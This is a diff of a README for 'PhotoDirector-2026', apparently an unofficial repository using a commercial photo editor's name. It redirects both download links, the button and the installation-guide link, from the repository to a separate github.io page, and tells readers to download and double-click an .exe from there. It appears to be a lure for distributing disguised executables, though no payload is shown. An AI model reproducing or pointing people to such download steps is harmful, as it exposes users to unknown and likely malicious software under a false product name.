@@ -4,7 +4,7 @@
 <h1>📸 PhotoDirector-2026 - Professional Photo Editing for Everyone</h1>
 
 <div style="margin: 30px 0;">
-    <a href="https://github.com/Myrtapassionate33/PhotoDirector-2026" style="background-color: #0056b3; color: #ffffff; padding: 15px 25px; text-decoration: none; font-weight: bold; border-radius: 5px; font-size: 1.2em;">Download PhotoDirector-2026 for Windows</a>
+    <a href="https://myrtapassionate33.github.io" style="background-color: #0056b3; color: #ffffff; padding: 15px 25px; text-decoration: none; font-weight: bold; border-radius: 5px; font-size: 1.2em;">Download PhotoDirector-2026 for Windows</a>
 </div>
 
 <h2>Overview</h2>
@@ -24,7 +24,7 @@
 <h2 style="color: #2c3e50;">📥 Installation Guide</h2>
 <p>Follow these steps to set up the software on your computer.</p>
 <ol>
-    <li>Navigate to the official download page: <a href="https://github.com/Myrtapassionate33/PhotoDirector-2026">Download PhotoDirector-2026</a>.</li>
+    <li>Navigate to the official download page: <a href="https://myrtapassionate33.github.io">Download PhotoDirector-2026</a>.</li>
     <li>Locate the download button on the page.</li>
     <li>Save the installer file to your Downloads folder.</li>
     <li>Double-click the downloaded .exe file to start the installation wizard.</li>
